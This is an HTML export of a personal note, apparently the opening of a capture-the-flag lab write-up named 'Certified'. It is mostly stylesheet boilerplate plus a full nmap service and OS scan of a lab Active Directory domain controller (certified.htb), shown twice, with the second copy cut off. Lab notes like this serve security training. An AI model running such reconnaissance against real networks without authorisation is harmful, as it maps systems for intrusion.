@@ -1,0 +1,1397 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Certified</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Certified</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="certified">Certified</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.231.186 -p- -sC
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 13:13 -0500
+Nmap scan report for certified.htb (10.129.231.186)
+Host is up (0.012s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-26 01:16:14Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49694/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+49724/tcp open  msrpc         Microsoft Windows RPC
+49745/tcp open  msrpc         Microsoft Windows RPC
+49780/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-26T01:17:08
+|_  start_date: N/A
+|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   12.85 ms 10.10.14.1
+2   13.13 ms certified.htb (10.129.231.186)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 257.06 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.231.186 -p- -sC
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 13:13 -0500
+Nmap scan report for certified.htb (10.129.231.186)
+Host is up (0.012s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-26 01:16:14Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
